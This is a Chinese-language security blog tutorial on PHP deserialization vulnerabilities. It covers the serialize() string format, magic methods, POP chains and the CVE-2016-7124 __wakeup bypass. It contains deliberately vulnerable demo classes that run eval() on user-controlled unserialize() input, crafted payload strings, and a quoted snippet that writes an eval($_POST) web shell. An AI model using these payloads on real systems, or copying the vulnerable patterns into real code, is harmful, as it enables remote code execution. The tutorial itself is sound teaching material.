---
title: PHP反序列化漏洞总结
date: 2019-03-27 22:55:33
categories: [PHP安全] 
tags: [序列化漏洞] 
---

### 什么是序列化
序列化操作就是把不便于传输的对象，数组或者其它数据结构的数据转变成便于传输的字符串结构。

### 序列化的数据结构
PHP用来处理序列化和反序列化的函数是`serialize`和`unserialize`。

下面我们用**serialize**函数把一个php对象序列化看一下：

```
<?php
class Test
{

	public $str;
	
}

$demo = new Test();
$demo->str = "Hello";
$str = serialize($demo);
echo $str;

```
输出结果如下：

`O:4:"Test":1:{s:3:"str";s:5:"Hello";}`

以上输出的字符串就是标准的PHP序列化字符串。

下面我们对序列化字符串的结构做一下总结:
<table><tr><td>O</td><td>Object的缩写，表示当前序列化字符串的原始数据为对象</td></tr><tr><td>4</td><td>表示对象名称为4个字符（对象名称Test为4个字符）</td></tr><tr><td>“Test”</td><td>当前对象的类名称，对应上一个4表示4个字符</td></tr><tr><td>1</td><td>1表示当前对象只有1个属性，只有一个$str 属性</td></tr><tr><td>{s:3:"str";s:5:"Hello";}</td><td>这个字符串表示当前对象属性的详情，以分号作为分割，两组分别表示对应的属性名称和属性值，比如s:3:"str";表示属性名称为s（string），长度为3，名称为str；s:5:"Hello"表示属性值为string，长度为5，值为“Hello”</td></tr></table>

以上的序列化结构分析当中，有2点需要记住：

##### 1).O代表此序列化字符串原始数据为一个对象，但并不是只有对象才能被序列化：数组，字符串这些数据结构都可以被序列化
<table><tr><td>O</td><td>Object的缩写，表示当前序列化字符串的原始数据为对象</td></tr><tr><td>b</td><td>boolean的缩写，表示序列化字符串的原始数据为布尔类型</td></tr><tr><td>i</td><td>integer的缩写，表示序列化字符串的原始数据为整形数据</td></tr><tr><td>d</td><td>double的缩写，表示序列化字符串的原始数据为double类型</td></tr><tr><td>N</td><td>NULL的缩写，表示序列化字符串的原始数据为NULL类型</td></tr><td>a</td><td>array的缩写，表示序列化字符串的原始数据为数组类型</td></tr></table>

我们写一个测试类，包含以上全部数据格式，然后看一下序列化之后的字符串。

```
<?php
class Test1
{

	public $str;  //字符串
	public $integer; //整形
	public $boolean; //布尔型
	public $double; //浮点型
	public $array;  //数组
	public $object; //对象
	
}

class Test2
{
	public $a = 1;
}

$demo = new Test1();
$demo->str = "Hello";
$demo->integer = 100;
$demo->boolean = True;
$demo->double = 99.99;
$demo->array = ['hello', 'world'];
$demo->object = new Test2();
$str = serialize($demo);
echo $str;

```
运行程序，得到结果:

```
O:5:"Test1":6:{s:3:"str";s:5:"Hello";s:7:"integer";i:100;s:7:"boolean";b:1;s:6:"double";d:99.999899999999996680344338528811931610107421875;s:5:"array";a:2:{i:0;s:5:"hello";i:1;s:5:"world";}s:6:"object";O:5:"Test2":1:{s:1:"a";i:1;}}
```
按照上面的分析，一目了然。
#### 2).序列化字符串当中类属性修饰符的体现(public,private)
上面的例子当中，我们类属性用的修饰符都是public，如果是private或protect呢？
我们来测试一下：

```
<?php
class Test3
{

	public $str = 'Hello';  //将属性或方法设置为可从任何地方访问
	protected $integer = 100;  //将属性或方法设置为可由其类或其后代访问
	private $boolean = true;  //将属性或方法设置为只能由其自己的类或对象访问
	
}

$demo = new Test3();
$str = serialize($demo);
echo $str;

```
执行结果如下：
`O:5:"Test3":3:{s:3:"str";s:5:"Hello";s:10:"*integer";i:100;s:14:"Test3boolean";b:1;}`

public 修饰的$str属性完全符合我们的预期，但是`protected`和`private`修饰的2个属性则不太一致。

PHP为了区分类属性限定符（public，protected，private），对序列化字符串做了如下处理：
<table><tr><td>public</td><td>默认模式</td><td></td></tr><tr><td>protected</td><td>用星号(\*)表示,并且\*前后各有1个空字节</td><td>`s:10:"*integer"`只有8个字节，实际上是s:10:"%00*%00integer"</td></tr><tr><td>private</td><td>在属性名称前面添加类名称前缀，并且类名称前后各有1个空字节</td><td>s:14:"Test3boolean"只有12个字节实际上是`s:14:"%00Test%003boolean"`</td></tr></table>

*注意：%00在这里只表示为一个空字节，实际上空字节是不可见的。*

我们直接对刚才带有protected和private的序列化结果进行反序列化试试看：

```
$str = 'O:5:"Test3":3:{s:3:"str";s:5:"Hello";s:10:"*integer";i:100;s:14:"Test3boolean";b:1;}';
echo unserialize($str);
```
直接提示错误：
```
Notice: unserialize(): Error at offset 53 of 84 bytes in /Users/Cui/www/test.php on line 16
```

正如上面所说，这是因为`$str`这个序列化字符串当中包含`protected`和`private`属性，需要在前缀前后各添加一个空字节。然后我们再试一下：

```
$str = 'O:5:"Test3":3:{s:3:"str";s:5:"Hello";s:10:"%00*%00integer";i:100;s:14:"%00Test3%00boolean";b:1;}';
var_dump(unserialize(urldecode($str)));  //urldecode是为了把%00转换成真正的空字节，如果通过浏览器传递参数，则%00会自动转换为空字节
```

成功得到结果：

```
object(Test3)[2]
  public 'str' => string 'Hello' (length=5)
  protected 'integer' => int 100
  private 'boolean' => boolean true
```

### 反序列化漏洞相关的PHP魔法方法
***魔法方法***是类当中能够在某种指定场景下自动触发的方法，跟序列化和反序列化相关的魔术方法主要有4个。
<table><tr><td>__construct</td><td>对象被创建的时候自动触发</td></tr><tr><td>\_\_destruct</td><td>对象被销毁时自动触发，这个基本上会自动触发</td></tr><tr><td>\_\_sleep</td><td>执行`serialize`方法时自动触发</td></tr><tr><td>\_\_wakeup</td><td>执行`unserialize `方法时自动触发</td></tr></table>
写个简单的例子测试一下：

```
<?php
class Test4
{
	public $str = 'hello';

	public function __construct()
	{
		echo "I am __construct.\r\n";
	}

	public function __destruct()
	{
		echo "I am __destruct.\r\n";
	}

	public function __sleep()
	{
		echo "I am __sleep.\r\n";
		return ['str'];   //__sleep方法要求必须返回需要被序列化的属性数组，否则会报错
	}

	public function __wakeup()
	{
		echo "I am __wakeup\r\n";
	}
	
}

$demo = new Test4();
$str = serialize($demo);
echo $str."\r\n";
```
执行返回结果：

```
I am __construct.
I am __sleep.
O:5:"Test4":1:{s:3:"str";s:5:"hello";}
I am __destruct.
```
以上没有触发`__wakeup`方法,因为上面所说，`__wakeup`方法是在执行`unserialize `方法进行反序列化时才会被自动触发。我们在上面的代码继续添加：

```
var_dump(unserialize($str));
```
执行结果：

```
I am __construct.
I am __sleep.
I am __wakeup
/Users/Cui/www/test.php:31:
object(Test4)[2]
  public 'str' => string 'hello' (length=5)
I am __destruct.
I am __destruct.

```

### PHP反序列化漏洞
***反序列化漏洞***在逻辑理解上跟一般的参数可控触发的漏洞不太一样。
比如一般的注入问题：

```
$param = $_GET['param'];  //参数可控
$sql = "SELECT * FROM admin WHERE id = ".$param;
mysql_query($param);
```
param参数可控，这我们一眼就能看出来。然后可以触发这个SQL注入问题。

但是反序列化漏洞往往是这样的：

```
<?php
class Test5
{
	public $str = 'hello';

	public function __destruct()
	{
		echo "I am __destruct.\r\n";
	}

	public function __sleep()
	{
		echo "I am __sleep.\r\n";
		return ['str'];   //__sleep方法要求必须返回需要被序列化的属性数组，否则会报错
	}

	public function __wakeup()
	{
		eval($this->str);  //执行恶意代码
	}
	
}
$param = $_GET["param"];
var_dump(unserialize($param));
```
但看Test5这个类当中的`__wakeup`方法,里面用`eval()`动态执行了$this->str。但是str这个属性明显是不可控的。

但是这里我们能控制的`$param`变量是整个反序列化字符串，也就是说我们控制的是整个对象。这意味着整个对象的任意属性对我们来说，都是可控的。

**所以查找反序列化漏洞的时候，一旦对象实例可控，那么我们分析的时候就应该认定所有属性可控，这样才能找到更复杂的反序列化漏洞。**

#### 常规PHP反序列化漏洞
如果web应用程序在__wakeup当中执行了文件写入操作或者代码执行操作，甚至可能引发其它漏洞的操作，利用精心构造的序列化字符串可以直接触发漏洞。

上面测试例子当中的`Test5`就是最基础的常规反序列化漏洞。当`$this->str`属性值为`phpinfo();`时，`eval($this->str)` 就成了 `eval('phpinfo();')`动态执行。我们构造一下恶意反序列化字符串：

```
<?php
class Test6
{
	public $str = 'phpinfo();';

	public function __wakeup()
	{
		eval($this->str);  //执行恶意代码
	}
	
}

$demo = new Test6();
echo serialize($demo);
```

得到恶意反序列化字符串：

```
O:5:"Test6":1:{s:3:"str";s:10:"phpinfo();";}
```

然后在`Test5`的例子中，用浏览器访问：http://localhost/test.php?param=O:5:"Test5":1:{s:3:"str";s:10:"phpinfo();";}, 触发漏洞：

![](/uploads/Test6.png)

#### 作用链PHP反序列化漏洞
序列化漏洞不一定发生在`__wakeup()`或者`__destruct()`本身所属的类。

比如：

```
<?php
class Test7
{
    public $project = 'hello';

    public function __construct()
    {
        $this->project = new Test8();
    }

    public function __wakeup()
    {
    	$this->project->run();
    }
    
}

class Test8
{

	public $str = "Hello";

	public function run()
	{
		echo "I am Test9";
	}
}

class Test9
{
	public $str = "Hello";

	public function run()
	{
		eval($this->str);  //执行恶意代码
	}
}

$param = $_GET["param"];
var_dump(unserialize($param));
```

这个案例当中`Test7`类存在`__wakeup()`方法，说明在下面`unserialize($param)`的时候，`Test7`是可控类。
我们对这个脚本进行反序列化操作（反序列化参数为`O:5:"Test7":1:{s:7:"project";O:5:"Test8":1:{s:3:"str";s:5:"Hello";}}`）时，得到如下结果：

![](/uploads/Test7.png)

`Test7`执行了`Test8`的`run()`方法, Test8的run方法是不存在安全问题的，但是Test9的run方法存在eval()动态执行代码，所以我们可以Test7所有属性可控的前提对此偷梁换柱。

首先生成恶意发序列化字符串：

```
<?php
class Test7
{
    public $project = 'hello';

    public function __construct()
    {
        $this->project = new Test9();  //将 Test8 修改为 Test9
    }

    public function __wakeup()
    {
    	$this->project->run();
    }
    
}

class Test8
{

	public $str = "Hello";

	public function run()
	{
		echo "I am Test9";
	}
}

class Test9
{
	public $str = "phpinfo();";  // 修改str属性为 phpinfo();

	public function run()
	{
		eval($this->str);  //执行恶意代码
	}
}

$demo = new Test7();
echo serialize($demo);
```
得到恶意反序列化字符串：

```
O:5:"Test7":1:{s:7:"project";O:5:"Test9":1:{s:3:"str";s:10:"phpinfo();";}}
```

利用此字符串触发漏洞：

![](/uploads/Test8.png)

#### 魔法方法__wakeup绕过引发的安全限制绕过问题(CVE-2016-7124)
这个问题属于PHP本身的Bug。

受影响PHP版本：Version < 5.6.25 || Version < 7.0.10

概括：当反序列化字符串当中的属性个数大于真实的属性个数时，会自动跳过`__wakeup()`方法。

我们用如下代码生成1个序列化字符串：

```
<?php
class Test10
{

    public $str;

    public function __construct()
    {
    	echo "I am __construct.\r\n";
    }

    public function __destruct()
    {
    	echo "I am __destruct.\r\n";
    }
    
    public function __wakeup()
    {
    	echo "I am __wakeup.\r\n";
    }
}

$demo = new Test10();
$demo->str = "Hello";
$str = serialize($demo);
echo $str;
```
得到结果：

`O:6:"Test10":1:{s:3:"str";s:5:"Hello";}`

这个序列化字符串当中，1 表示的是当前对象共有1个属性值，就是后面的str。

当我们把1改成2：

`O:6:"Test10":2:{s:3:"str";s:5:"Hello";}`

但是后面真实的属性值明显只有一个str，所以现在2大于真实的属性个数。

我们对这个字符串来进行反序列化看看：

```
<?php
class Test10
{

    public $str;

    public function __construct()
    {
    	echo "I am __construct.\r\n";
    }

    public function __destruct()
    {
    	echo "I am __destruct.\r\n";
    }
    
    public function __wakeup()
    {
    	echo "I am __wakeup.\r\n";
    }
}

$str = 'O:6:"Test10":2:{s:3:"str";s:5:"Hello";}';
var_dump(unserialize($str));
```
看一下结果：

![](/uploads/Test10.png)

只执行了`__destruct()`方法，并没有执行`__wakeup()`方法。

这个安全Bug造成严重安全问题著名的案例就是***[SugarCRM v6.5.23 PHP反序列化对象注入漏洞](https://www.anquanke.com/post/id/84549)***.

漏洞的基本原理代码如下(以下代码摘自安全客)：

```
<?php
class Test
{
   private $poc = '';
   public function __construct($poc)
   {
       $this->poc = $poc;
   }
   function __destruct()
   {
       if ($this->poc != '')
       {
           file_put_contents('shell.php', '<?php eval($_POST['shell']);?>');
           die('Success!!!');
       }
       else
       {
           die('fail to getshell!!!');
       }        
   }
   function __wakeup()
   {
       foreach(get_object_vars($this) as $k => $v)
       {
           $this->$k = null;
       }
       echo "waking up...n";
   }
}
$poc = $_GET['poc'];
if(!isset($poc))
{
   show_source(__FILE__);
   die();
}
$a = unserialize($poc);
```
上面的代码`__destruct()`方法当中出现可控的漏洞点。但是我们执行反序列化时，魔术方法的执行顺序链是`__wakeup()`=>`__destruct()`。

在`__wakeup()`方法当中，对象所有的属性都被设置成了null，导致我们反序列化之后的属性都被覆盖成了null，从而导致我们永远没法执行：

```
file_put_contents('shell.php', '<?php eval($_POST['shell']);?>');
die('Success!!!');
```

从而永远触发不了这个漏洞。

然而利用这个`__wakeup()`绕过的安全Bug，我们就能够绕过这种安全检测，再不触发`__wakeup()`方法的前提下，直接触发`__destruct()`方法，从而触发安全漏洞。
#### 其它魔术方法可能导致的二次漏洞
`__destruct()`,`__sleep()`,`__wakeup()`这3个方法都是在PHP序列化`serialize `和反序列化时自动触发的，所以如果存在以上跟这几个魔术方法直接相关的漏洞，是可以直接触发的。

但是PHP有非常多的魔术方法，比如`__toString()`,`__invoke()`,`__clone()`等方法。这些魔术方法都能够在指定的场景之下自动触发。
### 参考资料
[https://mp.weixin.qq.com/s/RL8_kDoHcZoED1G_BBxlWw](https://mp.weixin.qq.com/s/RL8_kDoHcZoED1G_BBxlWw)

[https://www.anquanke.com/post/id/86452](https://www.anquanke.com/post/id/86452)

[http://chybeta.github.io](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)